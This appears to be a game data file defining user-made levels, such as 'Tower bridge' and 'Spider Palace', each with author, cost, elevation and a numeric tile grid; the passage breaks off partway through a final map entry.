maps.push({name="Tower bridge",author="Luffaren",id="#1661441593",direction="forward",cost=262,elevation=0,map=[0,0,0,93,24,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,24,93,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,44,44,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,44,44,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,5,5,5,44,44,5,5,5,0,0,0,0,5,5,90,3,3,90,5,5,5,1,1,124,124,1,1,5,0,0,0,0,5,1,1,124,124,1,1,5,5,1,90,124,124,90,1,5,0,67,67,0,5,1,90,124,124,90,1,5,5,1,124,89,124,124,124,44,44,44,44,44,44,124,124,124,124,124,1,5,5,1,124,124,124,124,124,44,44,44,44,44,44,124,124,124,89,124,1,5,5,1,90,124,124,90,1,5,0,67,67,0,5,1,90,124,124,90,1,5,5,1,1,124,124,1,1,5,0,0,0,0,5,1,1,124,124,1,1,5,5,5,90,3,3,90,5,5,0,0,0,0,5,5,5,44,44,5,5,5,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,44,44,0,0,0,0,90,5,5,5,5,90,0,0,0,0,0,0,0,0,44,44,0,0,0,0,5,5,89,5,5,5,0,0,0,0,0,0,0,0,44,44,0,0,0,0,90,5,5,5,5,90,0,0,0,0,0,0,0,0,44,44,0,0,0,0,5,5,5,89,5,5,0,0,0,0,0,0,0,0,24,94,0,0,0,0,90,5,5,5,5,90,0,0,0,0,0,0,0,0,94,24,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Skid",author="tilgep",id="#1661443293",direction="right",cost=318,elevation=-2,map=[0,0,16,2,2,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,14,14,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,14,14,2,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,14,14,2,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,0,14,14,14,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,0,0,14,14,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,135,135,0,0,0,39,0,0,135,135,135,135,16,16,0,0,0,0,0,0,135,135,0,0,0,38,0,0,135,135,135,135,14,16,0,0,0,0,0,0,135,135,0,0,0,37,0,0,135,135,135,135,14,16,16,17,18,19,125,0,135,135,0,36,36,37,0,0,135,135,135,135,0,0,0,16,0,0,0,0,135,135,0,0,0,0,0,0,135,135,135,135,0,0,0,15,0,0,0,0,135,135,0,0,0,0,0,0,135,135,135,135,0,0,14,14,0,0,0,0,135,135,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,1,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,1,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,1,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,1,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="A Precarious Ride",author="tilgep",id="#1661443599",direction="forward",cost=290,elevation=11,map=[0,0,0,0,0,0,7,7,7,2,2,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,7,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,8,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,9,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,10,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,11,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,12,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,13,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,14,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,15,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,16,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,17,81,81,135,135,76,76,77,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,135,135,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,1,1,0,0,1,1,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,3,3,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,2,2,18,18,18,0,0,0,0,0,0]});
maps.push({name="MS01 tp edging",author="fara",id="#1661449874",direction="forward",cost=196,elevation=0,map=[17,12,2,2,12,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,132,132,12,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,12,86,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,88,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,1,1,1,1,1,0,0,12,12,12,0,0,0,0,12,12,12,12,12,12,131,131,131,131,131,12,12,12,93,12,0,0,0,0,12,12,90,12,12,12,131,131,131,131,131,12,12,12,94,12,0,0,0,0,12,87,12,12,0,0,1,1,1,1,1,0,0,12,12,12,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,86,12,88,0,0,0,0,12,0,12,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,12,0,67,0,12,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,67,19,67,0,0,12,102,0,0,0,0,12,12,132,132,12,12,0,0,12,0,67,0,12,0,0,0,0,0,0,0,12,12,101,101,12,12,0,0,0,12,0,12,0,0,0,0,0,0,0,0,17,101,2,2,101,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="MS02 tp bounce",author="fara",id="#1661449892",direction="forward",cost=300,elevation=0,map=[0,0,0,0,0,18,2,2,18,0,1,0,24,3,17,65,17,1,24,24,0,0,0,0,0,38,38,38,38,0,1,0,17,1,1,1,17,1,24,3,0,0,0,0,0,38,38,90,38,0,1,0,17,1,133,24,17,1,134,17,0,0,0,0,0,38,38,38,38,0,1,0,131,1,24,24,17,1,24,131,100,0,0,0,0,38,38,89,38,0,1,0,17,1,5,5,3,1,0,17,38,0,0,0,0,90,38,38,38,0,1,0,17,1,131,131,5,1,0,12,0,0,0,0,0,38,38,38,38,0,1,0,131,1,5,5,131,1,0,12,0,0,0,0,38,38,38,90,38,38,1,0,17,1,5,5,5,1,0,131,38,0,1,0,38,38,38,38,38,38,1,1,3,1,5,5,5,1,0,12,38,38,95,38,18,89,18,18,18,18,3,24,24,1,24,17,17,1,0,5,38,38,95,38,18,18,18,18,18,18,3,24,24,1,24,3,17,1,0,5,0,0,1,0,38,38,38,38,38,38,0,0,0,1,0,0,25,1,0,5,0,0,0,0,38,38,38,90,38,38,0,0,0,0,0,25,65,1,0,131,21,21,0,0,0,38,38,38,38,0,0,0,0,0,0,25,65,5,0,5,135,135,0,0,0,38,38,89,38,3,25,25,25,25,25,25,25,25,25,5,38,38,38,38,0,38,38,38,38,0,0,0,0,0,0,0,0,0,0,65,44,44,0,0,0,38,38,38,38,0,0,0,0,0,0,44,44,44,44,44,93,44,0,0,0,38,90,38,131,0,0,0,0,0,0,44,128,44,94,44,44,44,0,0,0,38,38,38,38,0,0,0,0,0,0,44,44,44,44,44,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="amogus",author="bunnyhop",id="#1661487713",direction="forward",cost=221,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,0,5,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,5,5,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,5,5,5,21,21,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,5,5,21,21,21,21,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,21,21,21,21,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,21,21,21,21,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,21,22,21,21,3,5,5,5,0,0,0,0,0,0,12,12,0,0,5,5,22,93,21,21,5,5,5,5,0,0,0,0,0,0,12,12,0,0,5,5,22,94,21,21,5,5,5,5,0,0,0,0,0,0,12,12,0,0,5,5,21,22,21,21,5,5,5,5,0,0,0,0,0,0,12,12,0,0,5,5,5,21,21,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,5,5,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,0,5,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,0,0,5,5,5,5,5,5,5,6,7,8,9,10,11,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="awesome",author="bunnyhop",id="#1661489911",direction="forward",cost=381,elevation=0,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,39,39,39,39,39,39,1,1,0,0,0,0,0,0,0,0,0,1,39,39,1,1,39,39,1,39,39,39,1,0,0,0,0,0,0,0,1,39,39,1,0,0,39,39,1,1,1,39,39,1,0,0,0,0,0,1,39,39,1,0,0,0,39,39,1,76,76,1,39,39,1,0,0,0,1,39,39,39,1,1,1,0,39,39,1,76,76,76,1,39,39,1,0,0,1,39,39,39,39,1,1,0,39,39,1,76,76,76,76,1,39,1,0,1,39,39,39,39,39,39,1,1,39,39,1,76,76,76,76,76,1,39,1,1,39,39,39,39,39,39,39,39,39,39,1,76,76,76,76,76,1,39,1,1,39,39,39,39,39,39,39,39,39,39,1,76,76,76,1,1,1,39,1,1,39,39,39,39,39,39,39,39,39,39,1,76,76,1,76,76,1,39,1,1,39,39,39,39,39,39,1,1,39,39,1,76,76,1,76,76,1,39,1,1,39,39,39,39,39,1,0,0,39,39,1,76,76,1,76,76,1,39,1,0,1,39,39,39,1,0,0,0,39,39,1,76,76,1,76,76,1,1,0,0,1,39,39,39,1,0,0,0,39,39,1,76,76,1,76,1,39,1,0,0,0,1,39,39,1,1,1,0,39,39,1,76,76,1,1,39,1,0,0,0,0,0,1,39,39,1,1,0,39,39,1,76,76,1,39,1,0,0,0,0,0,0,0,1,39,39,1,1,39,39,1,1,1,39,1,0,0,0,0,0,0,0,0,0,1,1,39,39,39,39,39,39,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="fast trigger or die",author="bunnyhop",id="#1661490051",direction="right",cost=422,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,9,9,105,9,90,9,9,9,105,9,9,9,9,9,90,9,9,9,1,1,9,9,105,9,9,9,90,9,105,9,9,90,9,9,9,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,105,105,105,9,9,9,1,1,9,90,105,9,9,105,9,9,105,9,90,105,100,93,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,5,5,105,9,9,9,1,1,9,9,105,9,90,105,9,90,105,9,9,105,6,6,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,7,7,105,9,9,9,1,1,90,9,105,9,9,105,9,9,105,90,9,105,8,8,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,9,9,105,9,9,9,2,1,9,9,105,9,9,105,90,9,105,9,9,105,9,9,105,9,9,9,2,1,9,9,105,90,9,105,9,9,105,9,90,105,9,9,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,9,9,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,9,9,105,9,9,9,1,1,9,90,105,9,90,105,9,90,105,9,9,105,9,9,94,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,9,9,105,9,9,9,1,1,9,9,105,9,9,105,9,9,105,9,9,105,9,9,105,9,9,9,1,1,9,9,90,9,9,105,9,9,9,90,9,105,9,3,17,9,9,9,1,1,9,9,9,9,9,105,9,90,9,9,9,105,9,9,17,4,9,9,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Spider Palace",author="Soft Serve",id="#1661531428",direction="forward",cost=362,elevation=9,map=[0,0,0,0,0,0,1,7,7,2,2,7,7,1,0,0,0,0,0,0,0,0,0,0,0,0,1,7,1,7,7,1,7,1,0,0,0,0,0,0,0,1,1,1,1,1,1,108,1,108,108,1,108,1,1,1,1,1,1,0,0,1,132,1,132,1,1,49,49,49,49,49,49,1,1,134,1,134,1,0,0,1,120,1,116,1,49,49,49,49,49,49,49,49,1,116,1,120,1,0,0,1,119,1,115,1,49,49,1,8,8,1,49,49,1,115,1,119,1,0,0,1,118,1,95,115,49,49,49,7,7,49,49,49,115,95,1,118,1,0,0,1,117,1,1,1,49,49,49,6,6,49,49,49,1,1,1,117,1,0,0,1,95,117,116,115,49,49,1,5,5,1,49,49,115,116,117,95,1,0,1,1,1,1,1,1,49,49,77,75,75,77,49,49,1,1,1,1,1,1,1,132,1,132,1,93,49,49,77,75,75,77,49,49,94,1,134,1,134,1,1,122,1,118,1,93,49,49,1,5,5,1,49,49,94,1,118,1,122,1,1,121,1,117,1,1,1,49,49,6,6,49,49,1,1,1,117,1,121,1,1,120,1,95,117,116,115,49,49,7,7,49,49,115,116,117,95,1,120,1,1,119,1,1,1,1,1,49,1,8,8,1,49,1,1,1,1,1,119,1,1,95,119,118,117,116,115,49,49,49,49,49,49,115,116,117,118,119,95,1,1,1,1,1,1,1,1,49,49,131,133,49,49,1,1,1,1,1,1,1,0,0,0,0,0,0,1,1,1,115,115,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,116,116,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Annoying Wait",author="ZpLit",id="#1661532834",direction="right",cost=64,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,1,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,1,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,1,4,4,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,16,16,1,88,9,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,50,50,49,9,2,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,50,50,49,9,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="equaliser",author="fraz",id="#1661540454",direction="right",cost=241,elevation=19,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,93,93,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,5,5,5,5,5,92,24,96,24,24,24,24,24,24,24,24,1,0,0,0,5,5,5,5,0,0,1,1,1,1,1,1,24,24,24,24,1,0,0,0,5,5,5,5,5,92,24,96,24,24,24,24,24,24,24,24,1,0,0,0,5,5,5,5,0,0,1,1,1,1,1,1,24,24,24,24,1,0,0,0,5,5,5,5,5,92,24,96,24,24,24,24,24,24,24,24,1,0,0,0,5,5,5,5,0,0,1,1,1,1,1,1,24,24,24,24,1,1,1,1,5,5,5,5,5,92,24,96,24,24,24,24,24,24,24,24,24,24,24,24,5,5,5,5,0,0,1,1,1,1,1,1,24,24,24,24,24,24,24,2,5,5,5,5,5,92,24,96,24,24,24,24,24,24,24,24,24,24,24,2,5,5,5,5,0,0,1,1,1,1,1,1,1,1,1,1,24,24,24,24,5,5,97,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="crack",author="fraz",id="#1661542565",direction="right",cost=521,elevation=-3,map=[24,8,2,2,8,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,8,8,8,8,7,6,5,5,5,75,5,5,5,5,5,5,5,5,24,24,7,7,7,7,7,6,75,5,5,5,5,5,5,5,75,5,5,5,24,24,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,75,24,24,75,5,5,5,5,5,5,5,5,5,75,5,5,5,5,5,5,5,24,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,5,5,5,5,75,5,5,75,5,5,5,5,5,5,75,5,5,5,24,24,5,5,5,5,5,5,5,5,5,5,75,5,5,5,5,5,5,75,24,24,5,5,75,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,24,5,5,5,5,5,5,5,5,5,5,84,84,84,84,84,84,84,84,24,24,5,5,5,5,5,5,5,5,75,5,81,5,5,5,5,5,5,5,24,24,5,5,5,5,5,5,5,5,5,5,81,5,75,5,5,5,75,5,24,24,5,5,5,5,75,5,84,84,84,84,84,5,5,5,5,5,5,5,24,24,5,75,5,5,5,5,81,5,5,5,84,84,84,84,84,84,84,84,24,24,5,5,5,5,5,5,81,5,5,5,5,5,5,5,5,5,5,5,24,76,77,84,84,84,84,84,81,5,5,5,5,5,5,5,75,5,5,95,5,24,5,5,5,5,5,5,5,5,5,5,75,5,5,5,5,5,5,95,2,24,5,75,5,92,15,15,5,75,5,5,5,5,5,75,5,5,5,95,2,24,5,5,5,15,93,15,5,5,5,5,5,5,5,5,5,5,5,95,5,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24]});
maps.push({name="trigger crush",author="fraz",id="#1661543193",direction="forward",cost=175,elevation=0,map=[0,0,0,0,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,96,96,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,92,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,97,105,105,105,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,105,93,105,1,0,0,0,0,0,0,0]});
maps.push({name="High Rise",author="Soft Serve",id="#1661545932",direction="forward",cost=273,elevation=-18,map=[24,2,2,24,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,24,24,24,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,96,64,64,64,63,62,61,61,1,1,0,0,0,0,0,0,0,0,0,0,96,64,64,64,90,64,64,60,1,1,0,0,0,0,0,0,0,0,0,0,96,64,64,64,64,64,64,59,1,1,1,1,1,1,0,0,0,0,0,0,1,96,96,96,1,64,64,58,1,1,1,1,1,1,0,0,0,0,0,0,42,0,0,0,96,58,58,58,57,56,55,55,1,1,0,0,0,0,0,0,41,0,0,0,96,58,58,58,90,58,58,54,1,1,0,0,0,0,0,0,41,0,0,0,96,58,58,58,58,58,58,53,1,1,1,1,1,1,0,0,93,41,41,42,1,96,96,96,1,58,58,52,1,1,1,1,1,1,0,0,0,0,0,0,36,0,0,0,96,52,52,52,51,50,49,49,1,1,0,0,0,0,0,0,35,0,0,0,96,52,52,52,90,52,52,48,1,1,0,0,0,0,0,0,35,0,0,0,96,52,52,52,52,52,52,47,1,1,1,1,0,0,0,0,93,35,35,36,1,96,96,96,1,52,52,46,1,1,1,1,0,0,0,0,0,0,0,0,30,0,0,0,96,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,29,0,0,0,96,46,46,46,90,46,46,46,0,0,0,0,0,0,0,0,29,0,0,0,96,46,46,46,46,46,46,46,0,0,0,0,0,0,0,0,93,29,29,30,1,96,96,96,1,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,2,6]});
maps.push({name="Trust the bounce",author="Luffaren",id="#1661548843",direction="left",cost=235,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,127,127,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,5,5,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,5,5,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,131,131,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,5,5,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,5,65,65,5,67,0,0,0,0,0,0,0,67,67,67,67,0,0,0,0,5,65,65,5,0,0,0,0,0,0,0,0,14,14,14,14,1,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,2,14,14,14,14,14,14,14,14,14,14,14,14,14,5,0,0,0,0,0,2,14,14,89,14,14,14,90,14,14,14,14,14,14,3,0,0,0,0,0,14,14,14,14,14,14,14,90,1,1,1,1,90,14,5,0,0,0,0,0]});
maps.push({name="Bandaid",author="MoistNoodlez",id="#1661557159",direction="forward",cost=140,elevation=0,map=[0,0,0,0,0,0,54,54,2,2,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,88,54,54,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,88,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,88,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67,67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,59,59,59,59,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,59,88,59,88,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,59,59,88,59,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,59,88,59,88,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,59,59,59,59,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67,67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,88,54,88,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,2,2,54,54,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bounce v2",author="MoistNoodlez",id="#1661557928",direction="forward",cost=131,elevation=0,map=[0,0,0,22,22,22,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,136,136,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,136,136,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,66,66,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,22,22,22,22,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,22,22,22,22,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,22,22,22,22,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,133,133,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,22,22,22,22,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,136,136,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,136,136,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="SFOTH Classic",author="Dogeeri",id="#1661575950",direction="left",cost=158,elevation=10,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,0,96,8,8,9,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,10,10,0,0,0,0,0,0,0,0,0,10,10,0,0,7,7,96,0,10,10,10,10,10,0,0,0,0,0,0,90,10,10,90,7,7,0,0,0,10,16,17,18,19,2,40,0,0,0,10,10,10,10,10,7,0,0,0,0,11,16,20,20,20,2,40,0,0,0,10,10,10,10,10,94,0,0,0,0,12,15,20,93,20,0,40,0,0,0,0,90,10,10,90,0,0,0,0,0,13,14,20,20,2